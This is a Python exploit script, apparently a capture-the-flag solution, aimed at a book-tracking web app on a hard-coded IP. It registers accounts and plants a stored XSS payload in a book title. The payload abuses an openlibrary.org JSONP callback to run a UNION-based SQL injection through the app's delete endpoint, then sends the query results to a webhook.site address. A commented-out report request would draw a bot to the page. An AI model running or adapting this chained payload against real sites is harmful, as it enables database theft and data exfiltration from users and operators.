import requests

import time

import json





def register(params,headers):

	response = requests.post('http://20.193.136.145:1337/register', params=params, headers=headers, verify=False)

	print (response.text)





def login(params,headers):

	response = requests.post('http://20.193.136.145:1337/api/login', params=params, headers=headers, verify=False)



	print(json.loads(response.text)["token"])



	cookies = {

	    'token': json.loads(response.text)["token"],

	}

	return cookies



def get_books(cookies,headers):

	response = requests.get('http://20.193.136.145:1337/getBooks', cookies=cookies, headers=headers, verify=False)

	print (response.text)





headers_normal = {

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',

    'Accept': '*/*',

    'Accept-Language': 'en-US,en;q=0.5',

    # 'Accept-Encoding': 'gzip, deflate',

    'Origin': 'http://20.193.136.145:1337',

    'Connection': 'keep-alive',

}



headers_create = {

    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',

    'Accept': '*/*',

    'Accept-Language': 'en-US,en;q=0.5',

    # 'Accept-Encoding': 'gzip, deflate',

    'Content-Type': 'application/json',

    'Origin': 'http://20.193.136.145:1337',

    'DNT': '1',

    'Sec-GPC': '1',

    'Connection': 'keep-alive',

}



#User1

params1 = {

    'username': 'user1',

    'password': '12345',

}



#User 2 for report

params2 = {

    'username': 'user2',

    'password': '12345',

}



#register user 1

register(params1,headers_normal)



#register user 2

register(params2,headers_normal)





#Logging in and getting token for User1

cookies1 = login(params1,headers_normal)



#Loggin in and getting token for User2

cookies2 = login(params2,headers_normal)





#Creating book with XSS payload

payload = "<iframe srcdoc=\"<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&callback=fetch(`/api/delete/?title=%22 UNION SELECT group_concat(link) FROM BOOKS--`,{method:`POST`}).then((response)=>response.text()).then((response)=>(window.top.location=`https://webhook.site/22c23ba2-cf25-43f5-b324-4ddac0ca9797/?q=${response}`));//'></script>a\"></iframe>"





data = f'{{title:{payload},author:ff,pages:4,imageLink:/assets/icons/bookshelf.svg,link:,read:false,fav:false}}'

response = requests.post('http://20.193.136.145:1337/api/create', cookies=cookies1, headers=headers_create, data=data)

time.sleep(1)



'''

#Test response 

response = {"status":"ok","book":{"title":"cdce","author":"Efef","pages":1,"imageLink":"/assets/icons/bookshelf.svg","link":"","fav":false,"read":false,"liteId":"8QM8rdERLC"}}

response_dict = json.loads(response)

liteId = response_dict['book']['liteId']



'''





#Report

'''

data = f'{{"user":"user2","liteId":"{liteId}","reason":"test"}}'

response = requests.post('http://20.193.136.145:1337/report', cookies=cookies2, headers=headers, data=data)

'''









